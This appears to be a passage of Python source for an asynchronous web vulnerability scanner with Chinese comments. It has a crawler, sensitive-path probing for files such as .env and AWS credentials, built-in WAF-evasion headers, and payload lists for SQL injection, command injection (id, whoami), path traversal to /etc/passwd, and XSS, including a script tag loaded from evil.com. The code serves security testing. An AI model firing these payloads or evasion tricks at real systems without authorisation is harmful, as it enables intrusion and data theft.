"""WVS v18.0 - 真正的漏洞扫描器"""
import asyncio
import re
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from typing import Dict, List, Set, Optional, Tuple
from dataclasses import dataclass, field
import aiohttp
from bs4 import BeautifulSoup

# 集成漏洞验证增强器
from .validation_enhancer import ValidationEnhancer

# 集成智能限速系统
try:
    from ..intelligent_rate_limiter import IntelligentRateLimiter
except ImportError:
    # 如果智能限速模块不可用，使用虚拟类
    class IntelligentRateLimiter:
        def __init__(self, config=None):
            self.config = config or {}

        async def acquire(self, n=1):
            return 0.0

        def update_metrics(self, status_code, response_time):
            pass

        def get_evasion_headers(self):
            return {}

        def randomize_request(self, params):
            return params

        def get_stats(self):
            return {}


@dataclass
class URLInfo:
    url: str
    method: str = "GET"
    params: Dict = field(default_factory=dict)
    form_data: Dict = field(default_factory=dict)
    headers: Dict = field(default_factory=dict)
    depth: int = 0
    parent: str = ""


@dataclass
class Vulnerability:
    type: str
    url: str
    parameter: str
    payload: str
    severity: str  # critical, high, medium, low, info
    confidence: float
    evidence: str = ""
    poc: str = ""


@dataclass
class ScanResult:
    urls: List[URLInfo]
    forms: List[Dict]
    vulnerabilities: List[Vulnerability]
    js_files: List[str]
    sensitive_paths: List[Dict]
    duration: float
    total_requests: int


class VulnerabilityScanner:
    """真正的漏洞检测器"""
    
    # SQL 注入 Payload
    SQLI_PAYLOADS = [
        # Error-based
        ("'", "SQL syntax", "error-based"),
        ("\"", "SQL syntax", "error-based"),
        ("'", "mysql_fetch", "error-based"),
        ("'", "ORA-", "error-based"),
        ("'", "Microsoft ODBC", "error-based"),
        ("'", "SQLite3::SQLException", "error-based"),
        ("'", "PG::SyntaxError", "error-based"),
        
        # Boolean-based
        (" AND 1=1", "", "boolean-based"),
        (" AND 1=2", "", "boolean-based"),
        ("' AND '1'='1", "", "boolean-based"),
        ("' AND '1'='2", "", "boolean-based"),
        
        # Time-based
        ("'; WAITFOR DELAY '0:0:3'--", "", "time-based"),
        ("' AND SLEEP(3)--", "", "time-based"),
        ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "", "time-based"),
        
        # Union-based
        ("' UNION SELECT NULL--", "", "union-based"),
        ("' UNION SELECT NULL,NULL--", "", "union-based"),
        ("' UNION SELECT NULL,NULL,NULL--", "", "union-based"),
        
        # 绕过变异
        ("' /**/AND/**/ 1=1--", "", "bypass"),
        ("'%20AND%201=1--", "", "bypass"),
        ("'+AND+1=1--", "", "bypass"),
    ]
    
    # SQL 错误特征
    SQL_ERRORS = [
        r"SQL syntax.*?MySQL",
        r"Warning.*?mysql_",
        r"MySqlException",
        r"PostgreSQL.*?ERROR",
        r"Warning.*?pg_",
        r"ORA-\d{5}",
        r"Microsoft ODBC",
        r"SQLite3::SQLException",
        r"Warning.*?sqlite_",
        r"PG::SyntaxError",
        r"Unclosed quotation mark",
        r"quoted string not properly terminated",
        r"mysql_fetch_array\(\)",
        r"mysql_num_rows\(\)",
    ]
    
    # XSS Payload
    XSS_PAYLOADS = [
        # 基础
        ("<script>alert(1)</script>", "basic"),
        ("<script>alert(String.fromCharCode(88,83,83))</script>", "basic"),
        ("</script><script>alert(1)</script>", "basic"),
        
        # 事件处理器
        ("<img src=x onerror=alert(1)>", "event"),
        ("<svg onload=alert(1)>", "event"),
        ("<body onload=alert(1)>", "event"),
        ("<input onfocus=alert(1) autofocus>", "event"),
        ("<marquee onstart=alert(1)>", "event"),
        ("<details open ontoggle=alert(1)>", "event"),
        
        # 绕过
        ("<ScRiPt>alert(1)</ScRiPt>", "bypass"),
        ("<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">", "bypass"),
        ("<SCRIPT/XSS SRC=\"http://evil.com/xss.js\"></SCRIPT>", "bypass"),
        ("<BODY ONLOAD=alert('XSS')>", "bypass"),
        
        # 编码
        ("%3Cscript%3Ealert(1)%3C/script%3E", "encoded"),
        ("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "encoded"),
        
        # HTML5
        ("<embed src=javascript:alert(1)>", "html5"),
        ("<audio src=x onerror=alert(1)>", "html5"),
        ("<video><source onerror=alert(1)>", "html5"),
        
        # JavaScript 协议
        ("javascript:alert(1)", "protocol"),
        ("JaVaScRiPt:alert(1)", "protocol"),
        ("data:text/html,<script>alert(1)</script>", "protocol"),
    ]
    
    # 命令注入 Payload
    CMDI_PAYLOADS = [
        ("; id", "unix"),
        ("| id", "unix"),
        ("`id`", "unix"),
        ("$(id)", "unix"),
        ("&& id", "unix"),
        ("|| id", "unix"),
        ("& whoami", "windows"),
        ("| whoami", "windows"),
        ("; ping -c 1 127.0.0.1", "time-based"),
        ("| ping -n 1 127.0.0.1", "time-based"),
    ]
    
    # 命令执行特征（严格匹配，避免误报）
    CMD_SIGNATURES = [
        r"uid=\d+",                    # uid=0(root) 或 uid=33(www-data)
        r"gid=\d+",                    # gid=0(root) 或 gid=33(www-data)
        r"(root|www-data|daemon|apache|mysql):",  # 用户名:密码 格式
        r"groups=.*?\s",                # groups=www-data 0
        r"total \d+",                   # ls -l 输出
        r"drwx|dr-x|rwx",              # 文件权限
        r"NT AUTHORITY",               # Windows 命令注入
        r"Windows IP Configuration",   # Windows ipconfig
        r"Packets: Sent =\d",          # ping 输出
        r"Pinging \d+\.\d+\.\d+\.\d+", # ping hostname
        r"bytes from",                 # ping 响应
        r"bin/bash|bin/sh",           # shell 标识
    ]
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.verify_ssl = self.config.get("verify_ssl", False)
        self.delay = self.config.get("delay", 0.1)  # 请求间隔

        # 认证
        self.session_cookies: Dict[str, str] = {}
        self.session_headers: Dict[str, str] = {}

        # 漏洞验证增强器
        self.validator = ValidationEnhancer(config)

        # 智能速率限制器
        self.rate_limiter = None
        rate_limit_config = self.config.get("rate_limiter", {})
        if rate_limit_config.get("enabled", True):
            # 向后兼容：如果配置了delay但未配置max_rps，则根据delay计算max_rps
            if "max_rps" not in rate_limit_config and self.delay > 0:
                rate_limit_config["max_rps"] = min(100, max(1, int(1.0 / self.delay)))

            # 确保有默认值
            rate_limit_config.setdefault("max_rps", 10)
            rate_limit_config.setdefault("mode", "burst")
            rate_limit_config.setdefault("enable_adaptive", True)
            rate_limit_config.setdefault("enable_waf_evasion", True)

            self.rate_limiter = IntelligentRateLimiter(rate_limit_config)
            print(f"[速率限制器] 已启用，配置: {rate_limit_config}")
    
    def set_auth(self, cookies: Dict = None, headers: Dict = None):
        if cookies:
            self.session_cookies.update(cookies)
        if headers:
            self.session_headers.update(headers)
    
    async def _send_request(self, session, url: str, method: str = "GET",
                           params: Dict = None, data: Dict = None) -> Tuple[int, str, float]:
        """发送请求，返回 (状态码, 响应内容, 耗时)"""
        # 应用速率限制（如果启用）
        if self.rate_limiter:
            wait_time = await self.rate_limiter.acquire()
            if wait_time > 0:
                # 可选：记录等待时间用于调试
                pass

        start = time.time()

        try:
            # 基础头部
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                **self.session_headers
            }

            # 添加WAF规避头部（如果启用）
            if self.rate_limiter:
                evasion_headers = self.rate_limiter.get_evasion_headers()
                headers.update(evasion_headers)

            # 随机化请求参数（如果启用）
            if self.rate_limiter and params:
                params = self.rate_limiter.randomize_request(params)

            if method.upper() == "GET":
                async with session.get(url, params=params, cookies=self.session_cookies,
                                       headers=headers, timeout=self.timeout) as resp:
                    content = await resp.text()
                    status = resp.status
            else:
                async with session.request(method, url, params=params, data=data,
                                          cookies=self.session_cookies, headers=headers,
                                          timeout=self.timeout) as resp:
                    content = await resp.text()
                    status = resp.status

            duration = time.time() - start

            # 更新速率限制器指标
            if self.rate_limiter:
                self.rate_limiter.update_metrics(status, duration)

            # 保持向后兼容：应用原始delay（如果未启用速率限制器）
            if not self.rate_limiter and self.delay > 0:
                await asyncio.sleep(self.delay)

            return status, content, duration

        except asyncio.TimeoutError:
            duration = time.time() - start
            if self.rate_limiter:
                self.rate_limiter.update_metrics(408, duration)
            return 408, "", self.timeout
        except Exception as e:
            duration = time.time() - start
            if self.rate_limiter:
                self.rate_limiter.update_metrics(0, duration)
            return 0, str(e), 0
    
    async def test_sqli(self, session, url: str, param: str, method: str = "GET", 
                       baseline_content: str = "", custom_payloads: list = None) -> List[Vulnerability]:
        """测试 SQL 注入
        
        Args:
            custom_payloads: 可选的自定义 payload 列表，格式为 [(payload, check_str, sqli_type), ...]
                           如果不提供，使用默认 SQLI_PAYLOADS
        """
        vulns = []
        
        # 使用自定义 payload 或默认
        payloads = custom_payloads if custom_payloads else self.SQLI_PAYLOADS
        
        for payload, check_str, sqli_type in payloads:
            # 构造测试 URL
            if method.upper() == "GET":
                test_params = {param: payload}
                status, content, duration = await self._send_request(session, url, "GET", test_params)
            else:
                test_data = {param: payload}
                status, content, duration = await self._send_request(session, url, "POST", data=test_data)
            
            await asyncio.sleep(self.delay)
            
            # Time-based 检测 - 先初步检测
            if sqli_type == "time-based" and duration >= 2.5:
                # 二次验证：排除网络抖动，提高置信度
                validation = await self.validator.validate_sqli_time_based(
                    session, url, param, payload, method, baseline_duration=1.0
                )
                if validation.is_valid:
                    vulns.append(Vulnerability(
                        type="SQL Injection (Time-based)",
                        url=url,
                        parameter=param,
                        payload=payload,
                        severity="critical",
                        confidence=validation.confidence,
                        evidence=validation.evidence,
                        poc=f"{url}?{param}={quote(payload)}"
                    ))
                    break
            
            # Error-based 检测
            for pattern in self.SQL_ERRORS:
                if re.search(pattern, content, re.IGNORECASE):
                    vulns.append(Vulnerability(
                        type="SQL Injection (Error-based)",
                        url=url,
                        parameter=param,
                        payload=payload,
                        severity="critical",
                        confidence=0.95,
                        evidence=content[:200],
                        poc=f"{url}?{param}={quote(payload)}"
                    ))
                    break
            
            if vulns:  # 已发现漏洞，跳出
                break
        
        return vulns
    
    async def test_xss(self, session, url: str, param: str, method: str = "GET",
                      custom_payloads: list = None) -> List[Vulnerability]:
        """测试 XSS - 精细化置信度
        
        Args:
            custom_payloads: 可选的自定义 payload 列表，格式为 [(payload, xss_type), ...]
        """
        vulns = []

        # 使用自定义 payload 或默认
        payloads = custom_payloads if custom_payloads else self.XSS_PAYLOADS

        for payload, xss_type in payloads:
            if method.upper() == "GET":
                test_params = {param: payload}
                status, content, duration = await self._send_request(session, url, "GET", test_params)
            else:
                test_data = {param: payload}
                status, content, duration = await self._send_request(session, url, "POST", data=test_data)

            await asyncio.sleep(self.delay)

            # ---------- 精细化 XSS 置信度判断 ----------
            confidence_info = self._assess_xss_confidence(payload, content)

            if confidence_info["is_xss"]:
                severity = confidence_info["severity"]
                confidence = confidence_info["confidence"]
                evidence = confidence_info["evidence"]

                # 根据 xss_type 调整类型描述
                if confidence >= 0.9:
                    type_label = xss_type.capitalize()
                elif confidence >= 0.7:
                    type_label = f"XSS ({xss_type})"
                elif confidence >= 0.4:
                    type_label = f"XSS (Filtered/{xss_type})"
                else:
                    type_label = f"XSS (WAF/Filtered)"

                vulns.append(Vulnerability(
                    type=type_label,
                    url=url,
                    parameter=param,
                    payload=payload,
                    severity=severity,
                    confidence=confidence,
                    evidence=evidence,
                    poc=f"{url}?{param}={quote(payload)}"
                ))
                # 只要找到一个高置信度的就停止，避免大量低置信度噪音
                if confidence >= 0.7:
                    break

        return vulns

    def _assess_xss_confidence(self, payload: str, content: str) -> Dict:
        """
        精细化评估 XSS 置信度
        返回: {"is_xss": bool, "confidence": float, "severity": str, "evidence": str}

        置信度分级:
          0.95+ = payload 完全反射，无过滤（高危）
          0.88+ = payload 在 attribute/value 上下文中反射
          0.7+  = payload 的解码版本被反射（双重编码绕过）
          0.3+  = payload 核心部分被反射，但标签被过滤（警告）
          0     = payload HTML 编码（安全过滤）
          0     = 无反射
        """
        from html import escape

        # ---------- 前置：在原始 HTML 中检查 ----------
        # 1. Payload 完全未编码反射 = 最高置信度
        if payload in content:
            return {
                "is_xss": True,
                "confidence": 0.95,
                "severity": "high",
                "evidence": f"Payload reflected verbatim (no filtering detected)"
            }

        # 2. HTML 实体编码检查（必须在 BeautifulSoup 之前）
        #    如果 payload 被编码后再出现 = 安全过滤
        encoded_payload = escape(payload)
        if encoded_payload in content:
            return {
                "is_xss": False,
                "confidence": 0.0,
                "severity": "low",
                "evidence": "Payload HTML-encoded (&lt;script&gt; detected - safely filtered)"
            }

        # 3. URL 编码检查
        from urllib.parse import quote
        url_encoded = quote(payload)
        if url_encoded in content:
            return {
                "is_xss": False,
                "confidence": 0.0,
                "severity": "low",
                "evidence": "Payload URL-encoded - safely filtered"
            }

        # ---------- BeautifulSoup 分析 ----------
        try:
            soup = BeautifulSoup(content, "html.parser")

            # 4. 在 attribute value 中反射（需要绕过引号/属性过滤）
            for tag in soup.find_all(attrs={}):
                for attr, val in tag.attrs.items():
                    if isinstance(val, str):
                        # payload 完整出现在属性值中
                        if payload in val:
                            ctx = f"'{attr}=\"{val[:60]}\"'"
                            return {
                                "is_xss": True,
                                "confidence": 0.88,
                                "severity": "high",
                                "evidence": f"Payload in attribute context: {ctx}"
                            }
                        # payload 解码版本在属性值中（双重编码绕过）
                        import html
                        decoded = html.unescape(payload)
                        if decoded != payload and decoded in val:
                            return {
                                "is_xss": True,
                                "confidence": 0.7,
                                "severity": "high",
                                "evidence": f"Payload HTML-decoded in attribute '{attr}' (double-encoding bypass)"
                            }

            # 5. 在 text 节点中反射
            for text_node in soup.find_all(string=True):
                text = str(text_node)
                if payload in text:
                    return {
                        "is_xss": True,
                        "confidence": 0.95,
                        "severity": "high",
                        "evidence": f"Payload in text node (verbatim, no filtering)"
                    }

        except Exception:
            pass

        # 6. 部分反射检查 - payload 核心部分被反射
        #    例：`<script>` 被过滤删除，但 `onerror=alert(1)` 仍然反射
        event_handlers = ["onerror", "onload", "onfocus", "onmouseover", "onclick", "oninput"]
        reflected_parts = []
        for eh in event_handlers:
            if eh in payload and eh in content:
                reflected_parts.append(eh)
        for kw in ["alert(", "document.", "eval(", "innerHTML"]:
            if kw in payload and kw in content:
                reflected_parts.append(kw)

        if reflected_parts:
            return {
                "is_xss": False,
                "confidence": 0.0,
                "severity": "low",
                "evidence": f"Tag filtered, but handlers reflected: {reflected_parts} (XSS possible with tag-bypass payloads)"
            }

        # 7. 无反射
        return {
            "is_xss": False,
            "confidence": 0.0,
            "severity": "info",
            "evidence": "No payload reflection detected"
        }
    
    async def test_cmdi(self, session, url: str, param: str, method: str = "GET") -> List[Vulnerability]:
        """测试命令注入 - 改进版：基线对比 + 多分隔符"""
        vulns = []

        # 先获取基线响应
        if method.upper() == "GET":
            _, baseline_content, _ = await self._send_request(session, url, "GET", {param: "127.0.0.1"})
        else:
            _, baseline_content, _ = await self._send_request(session, url, "POST", {param: "127.0.0.1"})
        await asyncio.sleep(self.delay)

        for payload, cmd_type in self.CMDI_PAYLOADS:
            if method.upper() == "GET":
                test_params = {param: payload}
                status, content, duration = await self._send_request(session, url, "GET", test_params)
            else:
                test_data = {param: payload}
                status, content, duration = await self._send_request(session, url, "POST", data=test_data)

            await asyncio.sleep(self.delay)

            # Time-based 检测 - 使用验证器二次确认
            if "time-based" in cmd_type and duration >= 2.5:
                validation = await self.validator.validate_sqli_time_based(
                    session, url, param, payload, method, baseline_duration=1.0
                )
                if validation.is_valid:
                    vulns.append(Vulnerability(
                        type="Command Injection (Time-based)",
                        url=url,
                        parameter=param,
                        payload=payload,
                        severity="critical",
                        confidence=validation.confidence,
                        evidence=validation.evidence,
                        poc=f"{url}?{param}={quote(payload)}"
                    ))
                    break

            # 回显检测 - 使用 token 验证提高置信度
            matched_sig = None
            matched_match = None
            for pattern in self.CMD_SIGNATURES:
                m = re.search(pattern, content, re.IGNORECASE)
                if m:
                    matched_sig = pattern
                    matched_match = m.group(0)
                    break

            if matched_sig:
                # 确认不是基线响应就有的内容
                baseline_has_it = re.search(matched_sig, baseline_content, re.IGNORECASE)
                if not baseline_has_it:
                    # 二次验证：使用随机 token 确认命令执行
                    validation = await self.validator.validate_cmdi_echo(
                        session, url, param, payload, method, os_type="auto"
                    )
                    if validation.is_valid:
                        vulns.append(Vulnerability(
                            type="Command Injection",
                            url=url,
                            parameter=param,
                            payload=payload,
                            severity="critical",
                            confidence=validation.confidence,
                            evidence=validation.evidence,
                            poc=f"{url}?{param}={quote(payload)}"
                        ))
                        break
                    else:
                        # Token 验证失败，但仍有特征，降低置信度报告
                        vulns.append(Vulnerability(
                            type="Command Injection",
                            url=url,
                            parameter=param,
                            payload=payload,
                            severity="high",
                            confidence=0.7,
                            evidence=f"Command output in response: '{matched_match}' (token validation failed)",
                            poc=f"{url}?{param}={quote(payload)}"
                        ))
                        break
                else:
                    # 基线中也有，说明这个端点本来就会输出命令结果
                    pass

            if vulns:
                break

        return vulns
    
    async def test_lfi(self, session, url: str, param: str, method: str = "GET") -> List[Vulnerability]:
        """测试本地文件包含 (LFI)"""
        vulns = []
        
        # LFI Payload - 常见敏感文件
        LFI_PAYLOADS = [
            ("../../../etc/passwd", "root:", "Linux passwd"),
            ("....//....//....//etc/passwd", "root:", "Linux passwd bypass"),
            ("/etc/passwd", "root:", "Linux passwd direct"),
            ("../../../windows/win.ini", "[extensions]", "Windows ini"),
            ("....\\....\\....\\windows\\win.ini", "[extensions]", "Windows ini bypass"),
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "", "PHP filter"),
            ("../../../var/log/apache2/access.log", "", "Apache log"),
            ("../../../proc/self/environ", "", "Proc environ"),
        ]
        
        for payload, check_str, lfi_type in LFI_PAYLOADS:
            if method.upper() == "GET":
                test_params = {param: payload}
                status, content, duration = await self._send_request(session, url, "GET", test_params)
            else:
                test_data = {param: payload}
                status, content, duration = await self._send_request(session, url, "POST", data=test_data)
            
            await asyncio.sleep(self.delay)
            
            # Check for successful LFI
            if check_str and check_str in content:
                vulns.append(Vulnerability(
                    type="Local File Inclusion",
                    url=url,
                    parameter=param,
                    payload=payload,
                    severity="critical",
                    confidence=0.95,
                    evidence=f"File content detected: {lfi_type}",
                    poc=f"{url}?{param}={quote(payload)}"
                ))
                break
            elif len(content) > 100 and "error" not in content.lower() and "not found" not in content.lower():
                # Potential LFI without known marker
                if "root:" in content or "www-data" in content or "[extensions]" in content:
                    vulns.append(Vulnerability(
                        type="Local File Inclusion",
                        url=url,
                        parameter=param,
                        payload=payload,
                        severity="critical",
                        confidence=0.9,
                        evidence=f"File content leaked ({len(content)} bytes)",
                        poc=f"{url}?{param}={quote(payload)}"
                    ))
                    break
        
        return vulns


class EnhancedCrawler:
    """增强型爬虫 - 修复版"""
    
    # 扩充敏感路径库（按严重度排序）
    SENSITIVE_PATHS = {
        # Critical - 凭证/密钥泄露
        "/.env": {"type": "Environment File", "severity": "critical"},
        "/wp-config.php": {"type": "WordPress Config", "severity": "critical"},
        "/.git/config": {"type": "Git Config", "severity": "high"},
        "/.git/HEAD": {"type": "Git HEAD", "severity": "high"},
        "/.svn/entries": {"type": "SVN Config", "severity": "high"},
        "/.htpasswd": {"type": "HTPasswd File", "severity": "critical"},
        "/config.php": {"type": "PHP Config", "severity": "high"},
        "/settings.py": {"type": "Django Settings", "severity": "critical"},
        "/.aws/credentials": {"type": "AWS Credentials", "severity": "critical"},

        # Critical - 备份/数据库
        "/backup.sql": {"type": "SQL Backup", "severity": "critical"},
        "/database.sql": {"type": "Database Dump", "severity": "critical"},
        "/backup.zip": {"type": "Backup Archive", "severity": "critical"},
        "/db_backup.sql": {"type": "DB Backup", "severity": "critical"},
        "/dump.sql": {"type": "SQL Dump", "severity": "critical"},

        # High - 信息泄露
        "/phpinfo.php": {"type": "PHP Info", "severity": "high"},
        "/info.php": {"type": "PHP Info", "severity": "high"},
        "/test.php": {"type": "PHP Test Page", "severity": "medium"},
        "/server-status": {"type": "Apache Status", "severity": "medium"},
        "/server-info": {"type": "Apache Info", "severity": "medium"},
        "/cgi-bin/": {"type": "CGI-bin Directory", "severity": "high"},
        "/cgi-bin/test.cgi": {"type": "CGI Test", "severity": "high"},

        # High - 管理面板
        "/admin/": {"type": "Admin Panel", "severity": "high"},
        "/admin/index.php": {"type": "Admin Index", "severity": "high"},
        "/admin/login.php": {"type": "Admin Login", "severity": "medium"},
        "/administrator/": {"type": "Administrator", "severity": "high"},
        "/backend/": {"type": "Backend Panel", "severity": "high"},

        # High - 数据库管理
        "/phpmyadmin/": {"type": "phpMyAdmin", "severity": "high"},
        "/phpMyAdmin/": {"type": "phpMyAdmin", "severity": "high"},
        "/pma/": {"type": "phpMyAdmin (Alt)", "severity": "high"},
        "/dbadmin/": {"type": "DB Admin", "severity": "high"},
        "/mysql/": {"type": "MySQL Console", "severity": "high"},
        "/sql/": {"type": "SQL Console", "severity": "high"},

        # High - 特定应用（Metasploitable2 等靶机常见）
        "/dvwa/": {"type": "DVWA (Vuln App)", "severity": "info"},
        "/dvwa/vulnerabilities/sqli/": {"type": "DVWA SQLi", "severity": "info"},
        "/dvwa/vulnerabilities/xss_r/": {"type": "DVWA XSS", "severity": "info"},
        "/mutillidae/": {"type": "Mutillidae (Vuln App)", "severity": "info"},
        "/twiki/": {"type": "TWiki", "severity": "info"},
        "/tikiwiki/": {"type": "TikiWiki", "severity": "info"},
        "/phpmyadmin/setup/": {"type": "phpMyAdmin Setup", "severity": "high"},

        # Medium - API/开发文档
        "/swagger-ui.html": {"type": "Swagger UI", "severity": "medium"},
        "/swagger/": {"type": "Swagger API", "severity": "medium"},
        "/api-docs/": {"type": "API Docs", "severity": "medium"},
        "/api/swagger.json": {"type": "OpenAPI Spec", "severity": "medium"},
        "/actuator/": {"type": "Spring Actuator", "severity": "high"},
        "/actuator/env": {"type": "Spring Env", "severity": "high"},
        "/actuator/configprops": {"type": "Spring Config", "severity": "high"},

        # Medium - Tomcat
        "/manager/html": {"type": "Tomcat Manager", "severity": "high"},
        "/manager/status": {"type": "Tomcat Status", "severity": "medium"},
        "/host-manager/html": {"type": "Tomcat Host Manager", "severity": "medium"},

        # Low - 其他
        "/.DS_Store": {"type": "macOS DS_Store", "severity": "low"},
        "/.htaccess": {"type": "Apache Config", "severity": "medium"},
        "/web.config": {"type": "IIS Config", "severity": "high"},
        "/crossdomain.xml": {"type": "Flash Policy", "severity": "low"},
        "/clientaccesspolicy.xml": {"type": "Silverlight Policy", "severity": "low"},
        "/webdav/": {"type": "WebDAV", "severity": "high"},
        "/~root/": {"type": "User Dir (root)", "severity": "high"},
        "/~admin/": {"type": "User Dir (admin)", "severity": "high"},
        "/examples/": {"type": "Apache Examples", "severity": "medium"},
        "/printers/": {"type": "CUPS Printer", "severity": "medium"},
    }
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.max_depth = self.config.get("max_depth", 3)
        self.max_urls = self.config.get("max_urls", 500)
        self.concurrency = self.config.get("concurrency", 10)
        self.timeout = self.config.get("timeout", 10)
        self.verify_ssl = self.config.get("verify_ssl", False)
        self.delay = self.config.get("delay", 0.1)

        self.session_cookies: Dict[str, str] = {}
        self.session_headers: Dict[str, str] = {}
        self.visited: Set[str] = set()

        # 智能速率限制器（用于爬虫请求）
        self.rate_limiter = None
        rate_limit_config = self.config.get("rate_limiter", {})
        if rate_limit_config.get("enabled", True):
            # 向后兼容：如果配置了delay但未配置max_rps，则根据delay计算max_rps
            if "max_rps" not in rate_limit_config and self.delay > 0:
                rate_limit_config["max_rps"] = min(100, max(1, int(1.0 / self.delay)))

            # 确保有默认值
            rate_limit_config.setdefault("max_rps", 10)
            rate_limit_config.setdefault("mode", "burst")
            rate_limit_config.setdefault("enable_adaptive", True)
            rate_limit_config.setdefault("enable_waf_evasion", True)

            # 导入可能失败（如果intelligent_rate_limiter模块不可用）
            try:
                from ..intelligent_rate_limiter import IntelligentRateLimiter
                self.rate_limiter = IntelligentRateLimiter(rate_limit_config)
                print(f"[爬虫速率限制器] 已启用，配置: {rate_limit_config}")
            except ImportError:
                pass
    
    def set_auth(self, cookies: Dict = None, headers: Dict = None):
        if cookies:
            self.session_cookies.update(cookies)
        if headers:
            self.session_headers.update(headers)
    
    async def crawl(self, start_url: str) -> ScanResult:
        """爬取网站"""
        start_time = time.time()
        
        all_urls: List[URLInfo] = []
        all_forms: List[Dict] = []
        all_js_files: Set[str] = set()
        sensitive_found: List[Dict] = []
        total_requests = 0
        
        parsed_start = urlparse(start_url)
        base_domain = parsed_start.netloc
        
        # 简化的爬取逻辑
        async def fetch_page(url: str, depth: int):
            nonlocal total_requests
            
            if depth > self.max_depth:
                return []
            
            url_norm = url.split('#')[0].split('?')[0]
            if url_norm in self.visited:
                return []
            self.visited.add(url_norm)
            
            try:
                # 应用速率限制（如果启用）
                if self.rate_limiter:
                    wait_time = await self.rate_limiter.acquire()
                    if wait_time > 0:
                        # 可选：记录等待时间用于调试
                        pass

                connector = aiohttp.TCPConnector(ssl=self.verify_ssl)
                timeout = aiohttp.ClientTimeout(total=self.timeout)

                # 基础头部
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "text/html,application/xhtml+xml,*/*",
                    **self.session_headers
                }

                # 添加WAF规避头部（如果启用）
                if self.rate_limiter:
                    evasion_headers = self.rate_limiter.get_evasion_headers()
                    headers.update(evasion_headers)

                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    request_start = time.time()
                    async with session.get(url, headers=headers, cookies=self.session_cookies) as resp:
                        if resp.status != 200:
                            # 更新速率限制器指标（即使状态码不是200）
                            if self.rate_limiter:
                                duration = time.time() - request_start
                                self.rate_limiter.update_metrics(resp.status, duration)
                            return []

                        total_requests += 1
                        content = await resp.text()

                        # 更新速率限制器指标
                        if self.rate_limiter:
                            duration = time.time() - request_start
                            self.rate_limiter.update_metrics(resp.status, duration)
                        
                        # 记录当前 URL
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        params = {k: v[0] if len(v) == 1 else v for k, v in params.items()}
                        
                        url_info = URLInfo(
                            url=url,
                            params=params,
                            depth=depth
                        )
                        all_urls.append(url_info)
                        
                        # 解析 HTML
                        soup = BeautifulSoup(content, 'lxml')
                        
                        # 提取链接
                        new_urls = []
                        for link in soup.find_all('a', href=True):
                            href = link['href']
                            if href.startswith('javascript:') or href.startswith('#'):
                                continue
                            
                            full_url = urljoin(url, href)
                            parsed_href = urlparse(full_url)
                            
                            # 同域名检查
                            if parsed_href.netloc != base_domain:
                                continue
                            
                            # 过滤静态资源
                            if any(parsed_href.path.lower().endswith(ext) for ext in 
                                   ['.jpg', '.jpeg', '.png', '.gif', '.css', '.ico', '.svg', '.woff', '.woff2', '.ttf']):
                                continue
                            
                            new_urls.append((full_url, depth + 1))
                        
                        # 提取表单
                        for form in soup.find_all('form'):
                            action = form.get('action', '')
                            method = form.get('method', 'GET').upper()
                            inputs = {}
                            
                            for input_tag in form.find_all(['input', 'textarea', 'select']):
                                name = input_tag.get('name')
                                if name:
                                    input_type = input_tag.get('type', 'text')
                                    inputs[name] = {
                                        'type': input_type,
                                        'value': input_tag.get('value', '')
                                    }
                            
                            form_url = urljoin(url, action)
                            all_forms.append({
                                "url": form_url,
                                "method": method,
                                "inputs": inputs,
                                "parent": url
                            })
                            
                            # 表单也作为测试 URL
                            if form_url not in self.visited:
                                new_urls.append((form_url, depth + 1))
                        
                        # 提取 JS
                        for script in soup.find_all('script', src=True):
                            js_url = urljoin(url, script['src'])
                            all_js_files.add(js_url)

                        # 仅当未启用速率限制器时应用原始delay
                        if not self.rate_limiter and self.delay > 0:
                            await asyncio.sleep(self.delay)
                        return new_urls
                        
            except Exception as e:
                return []
        
        # ── 覆盖率增强：预置常见路径 ──
        queue: List[tuple] = []
        parsed_s = urlparse(start_url)
        base_url = f"{parsed_s.scheme}://{parsed_s.netloc}"

        # 1. 常见静态路由（CMS / 靶机通用）
        common_routes = [
            "index.php?page=login", "index.php?page=home", "index.php?page=about",
            "index.php?page=register", "index.php?page=profile", "index.php?page=search",
            "index.php?page=guestbook", "index.php?page=contact", "index.php?page=archive",
            "index.php?page=article", "index.php?page=post", "index.php?page=category",
            "index.php?page=comment", "index.php?page=page", "index.php?page=posts",
            "admin/", "admin/index.php", "administrator/", "backend/",
            "login.php", "login/", "logout.php", "logout/",
            "register.php", "signup.php", "signin.php",
            "dashboard.php", "dashboard/", "account.php", "profile.php",
            "api/", "api/index.php", "api/login",
            "/dvwa/login.php", "/dvwa/", "/mutillidae/index.php?page=login.php",
            "/phpmyadmin/", "/tikiwiki/", "/twiki/",
        ]
        for route in common_routes:
            seed_url = urljoin(base_url, route)
            if seed_url not in self.visited:
                queue.append((seed_url, 0))

        # 2. 参数模糊探测（?page=X / ?id=X / ?cat=X）
        if '?' not in start_url:
            param_buckets = {
                "page": ["login","home","about","register","profile","search","guestbook",
                         "contact","archive","article","post","posts","category","comment","page"],
                "id":   ["1","2","3","0","99","100"],
                "cat":  ["1","2","news","product"],
                "q":    ["test","admin","login","search"],
            }
            for param, values in param_buckets.items():
                for val in values:
                    fuzz_url = f"{base_url}/index.php?{param}={val}"
                    if fuzz_url not in self.visited:
                        queue.append((fuzz_url, 0))

        # ── 原有起始 URL ──
        if start_url not in self.visited:
            queue.append((start_url, 0))

        # BFS 爬取
        while queue and len(all_urls) < self.max_urls:
            url, depth = queue.pop(0)
            new_urls = await fetch_page(url, depth)
            queue.extend(new_urls)
        
        # 检测敏感路径
        async with aiohttp.ClientSession() as session:
            for path, info in self.SENSITIVE_PATHS.items():
                test_url = urljoin(f"{parsed_start.scheme}://{base_domain}", path)
                try:
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            # 验证有效性（排除误报）
